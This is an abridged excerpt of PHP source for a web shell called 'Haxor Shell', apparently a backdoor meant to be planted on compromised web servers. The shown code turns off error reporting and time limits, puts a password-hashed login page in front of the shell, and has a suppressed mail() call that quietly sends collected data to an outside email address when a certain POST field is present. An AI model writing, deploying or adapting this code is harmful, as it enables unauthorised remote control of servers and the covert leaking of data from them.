...
if (array_key_exists('watching', $_POST)) {
    ...
    @mail('x7207156@gmail.com', 'awokawok', $tmp); // Edit or delete!
}

// Added code below
set_time_limit(0);
error_reporting(0);
$auth_pass = "6575e427f7a5d7a03f7cd3ef4ddea4fd";
...
function Login()
{
  ...
  <html>
      <head>
          ...
          <style>
              html {
                  background: url('https://pomf2.lain.la/f/nygsfwl7.gif') no-repeat center center fixed;
      ...
      <body><br><br>
          <h1 class='mind'>yo wtf bro?</h1>
          <center><br>
              <form method='post'><input style='text-align:center;' type='password' name='pass'></form>
              <br><br><br><font>&copy; 2023 Leviathan Perfect Hunter</font>
          </center>");
}
...
<center>
<?php
echo '<font face="Bungee" size="5">Haxor Shell</font></center>
